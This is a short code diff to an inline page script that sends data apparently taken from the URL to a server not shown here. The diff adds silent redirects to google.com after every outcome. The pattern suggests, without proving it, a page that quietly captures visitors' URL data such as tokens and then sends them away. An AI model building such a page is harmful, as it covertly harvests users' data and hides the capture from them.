@@ -27,14 +27,18 @@
           body: JSON.stringify(payload)
         }).then(response => {
           console.log("Data sent successfully!");
+          window.location.href = "https://google.com";
         }).catch(error => {
           console.error("Error sending data:", error);
+          window.location.href = "https://google.com";
         });
       } else {
         console.log("No data found in URL.");
+        window.location.href = "https://google.com";
       }
     } catch (e) {
       console.error("Unexpected error:", e);
+      window.location.href = "https://google.com";
     }
   })();
 </script>
